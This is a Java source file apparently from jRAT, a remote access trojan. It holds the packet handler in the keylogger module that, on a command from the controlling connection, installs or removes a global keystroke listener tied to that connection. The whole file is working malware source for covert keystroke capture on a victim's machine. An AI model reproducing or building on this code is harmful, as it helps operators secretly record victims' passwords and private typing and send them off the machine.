package jrat.module.keys.packets;

import jrat.client.Connection;
import jrat.client.packets.incoming.IncomingPacket;
import jrat.module.keys.Keylogger;
import org.jnativehook.GlobalScreen;

public class PacketToggleLive implements IncomingPacket {

    public void read(Connection con) throws Exception {
        boolean enabled = con.readBoolean();

        if (enabled) {
            Keylogger keylogger = new Keylogger(con);
            Keylogger.instance = keylogger;
            GlobalScreen.addNativeKeyListener(keylogger);
        } else if (Keylogger.instance != null) {
            GlobalScreen.removeNativeKeyListener(Keylogger.instance);
        }
    }
}
